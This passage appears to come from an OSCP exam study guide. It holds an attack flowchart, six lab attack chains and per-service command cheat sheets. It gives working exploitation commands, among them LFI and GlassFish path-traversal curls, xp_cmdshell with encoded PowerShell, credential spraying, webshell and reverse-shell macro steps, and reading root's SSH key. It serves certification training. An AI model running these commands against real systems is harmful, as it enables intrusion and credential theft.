└────┬─────┘    │    └────┬────┘ └────┬────┘    │
     │          │         │           │          │
     └──────────┴────┬────┴───────────┴──────────┘
                     │
                     ▼
          ┌──────────────────┐
          │  Got Credentials │
          │    or Shell?     │
          └────────┬─────────┘
                   │
          ┌────────┴────────┐
          │                 │
          ▼                 ▼
   ┌────────────┐    ┌────────────┐
   │ Credential │    │   Shell    │
   │   Spray    │    │  Obtained  │
   │ SSH/RDP/SMB│    │            │
   └─────┬──────┘    └─────┬──────┘
         │                 │
         └────────┬────────┘
                  │
                  ▼
         ┌────────────────┐
         │  Privilege     │
         │  Escalation    │
         ├────────────────┤
         │Linux:          │
         │• sudo -l       │
         │• SUID          │
         │• Disk group    │
         │• Cron jobs     │
         ├────────────────┤
         │Windows:        │
         │• SeImpersonate │
         │• SeBackup      │
         │• DLL Hijack    │
         │• Unquoted Svc  │
         └───────┬────────┘
                 │
                 ▼
         ┌────────────────┐
         │   ROOT/ADMIN   │
         │   proof.txt    │
         └────────────────┘
```

---

## Common Standalone Attack Chains

### Chain 1: FTP → Keychain Crack → RDP

```text
Target: 192.168.87.111 (Windows)
1. FTP anonymous login → download .keychain file
2. keychain2john → john → crack password
3. RDP with found credentials
4. Privilege escalation → SysaxScheduler exploit
5. Got SYSTEM → proof.txt
```

### Chain 2: WordPress LFI → Config Creds → SSH

```text
Target: 192.168.122.112 (Linux)
1. nmap → Port 80 WordPress
2. WPScan → Mail Masta plugin
3. LFI via php://filter → wp-config.php (base64)
4. Decode → database credentials
5. SSH with found credentials
6. sudo mawk → GTFOBins → root
```

### Chain 3: File Manager → Webshell → Disk Group

```text
Target: Extplorer (Linux)
1. gobuster → /eXtplorer directory
2. Default credentials: admin:admin
3. Upload PHP webshell
4. id → user in "disk" group
5. debugfs /dev/sda1 → read /root/.ssh/id_rsa
6. SSH as root
```

### Chain 4: Default Creds → ZIP Password → DLL Hijack

```text
Target: 192.168.122.111 (Windows)
1. HTTP → File Management System (default creds)
2. Download backup.zip
3. zip2john → john → crack password
4. exiftool → find username in metadata
5. RDP spray with found credentials
6. DLL Hijacking (Wondershare Dr.Fone) → SYSTEM
```

### Chain 5: GlassFish → WAR Deploy → Root

```text
Target: Fish (Linux)
1. Port 4848 → GlassFish admin
2. Path traversal (CVE-2017-1000028) → admin password
3. Login to admin console
4. Deploy malicious WAR file
5. Reverse shell as glassfish user
6. LinPEAS → find privesc vector → root
```

### Chain 6: LibreOffice Macro → ODT Upload

```text
Target: Craft (Linux)
1. Web app allows ODT file upload
2. Create ODT with Python macro (reverse shell)
3. Upload and wait for execution (or trigger)
4. Got shell as user
5. LinPEAS → privesc → root
```

---

## Standalone Quick Reference by Service

### FTP (21)

```shell
ftp $target                    # anonymous:anonymous
get id_rsa                     # SSH key
get backup.zip                 # Crack with zip2john
get .keychain                  # Crack with keychain2john
```

### HTTP (80/443/8080)

```shell
# Enumeration
gobuster dir -u http://$target -w wordlist.txt -x php,txt,html
nikto -h http://$target
wpscan --url http://$target -e ap,at,u

# Common CVEs
# Mail Masta LFI
curl "http://$target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# GlassFish Path Traversal
curl "http://$target:4848/theme/META-INF/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile"
```

### SMB (445)

```shell
smbclient -L //$target -N               # List shares
smbclient //$target/share -N -c 'mget *' # Download all
netexec smb $target -u '' -p '' --shares # Null session
```

### MSSQL (1433)

```shell
impacket-mssqlclient user:pass@$target -windows-auth
> enable_xp_cmdshell
> xp_cmdshell "powershell -e <BASE64>"
```

### RDP (3389)

```shell
xfreerdp /u:user /p:password /v:$target /cert-ignore
netexec rdp $target -u users.txt -p 'Password123'  # Spray
```

---

## See Also

### AD Exploitation

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - PowerView, BloodHound, ACL Abuse, GPO Abuse
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - ASREPRoast, Kerberoasting, Golden/Silver Tickets
- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay attacks
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - hashcat, mimikatz, Credential Dumping

### Privilege Escalation

- **[Windows PrivEsc](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - SeImpersonate, DLL Hijacking, Registry
- **[Linux PrivEsc](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - SUID, sudo, Capabilities
- **[Potato Exploits](../4.Privilege-Escalation/4.5.Potato-Exploits.md)** - SigmaPotato, GodPotato, PrintSpoofer

### Lateral Movement & Pivoting

- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, PTH, PTT
- **[Ligolo-ng Complete Guide](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Single/multi-hop pivoting

### Web Exploitation

- **[Web Application Analysis](../7.Web-Exploit/7.0.Web-Application-Analysis.md)** - Directory enum, subdomain discovery
- **[SQL Injection](../7.Web-Exploit/7.1.SQL-Injection.md)** - SQLMap, manual techniques
- **[File Inclusion](../7.Web-Exploit/7.3.File-Inclusion.md)** - LFI, RFI, log poisoning

### Command References

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - All reverse shell one-liners
- **[Wordlist Guide](../6.OS-Command/6.4.Wordlist-Guide.md)** - Username/password wordlists

---

## References

- [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632)
- [OSCP Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924)
- [Proctoring Tool Manual](https://help.offsec.com/hc/en-us/articles/360050299352)
- [Contact Support](https://help.offsec.com/hc/en-us/articles/8822709273620)
